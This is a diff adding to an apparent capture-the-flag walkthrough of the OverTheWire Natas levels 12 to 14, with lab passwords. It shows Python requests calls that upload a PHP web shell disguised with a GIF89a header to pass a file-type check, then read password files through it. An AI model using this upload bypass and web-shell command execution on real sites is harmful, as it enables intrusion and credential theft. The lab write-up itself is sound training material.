@@ -191,3 +191,17 @@ requests.post(url, files = {'uploadedfile' : open('natas12.php', 'rb')}, data = 
 // the php loading worked, We get a file creation path : upload/jugty0ntdu.php
 session.get(url + 'upload/umde6zpk53.php?c= cat /etc/natas_webpass/natas13', auth = (username, password))
 jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+lvl 13 --> lvl 14
+http://natas13.natas.labs.overthewire.org/
+natas13
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+// The point of this level is to upload a file to the server circumventing its check for a jpeg file
+// Mainly, we want to hide the php description on writing command : file natas13.php
+// To do so, we add a header in our php file saying otherwise (GIF89a)
+// Now on writing file natas13.php, we get : natas13.php: GIF image data, version 89a, 2573 x 2573
+// We successfully loaded our file and get : 
+The file <a href="upload/tnmjsvarti.php">upload/tnmjsvarti.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+// We can now access data through :
+response = session.get(url + 'upload/tnmjsvarti.php?c= cat /etc/natas_webpass/natas14', auth = (username, password))
+Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
